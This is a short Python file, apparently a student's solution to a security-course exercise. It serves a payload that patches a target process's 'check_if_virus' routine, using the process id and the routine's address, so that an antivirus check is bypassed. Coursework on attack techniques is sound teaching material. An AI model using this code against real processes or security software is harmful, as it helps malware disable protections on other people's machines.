import server
import struct
from addresses import CHECK_IF_VIRUS_CODE, address_to_bytes

class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        # Return a payload that will replace the check_if_virus code.
        # 1. You can assume we already compiled q2.c into q2.template.
        # 2. Use CHECK_IF_VIRUS_CODE.

        fp_r = open("q2.template", "rb")
        temp = fp_r.read()
        temp=temp.replace("\x78\x56\x34\x12", address_to_bytes(pid), 1)
        temp=temp.replace("\x21\x11\x01\x91", address_to_bytes(CHECK_IF_VIRUS_CODE), 1)
        fp_r.close()

        fp_w = open("q2.template", "wb") 
        fp_w.write(temp)
        fp_w.close()
        
        return "./q2.template"

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

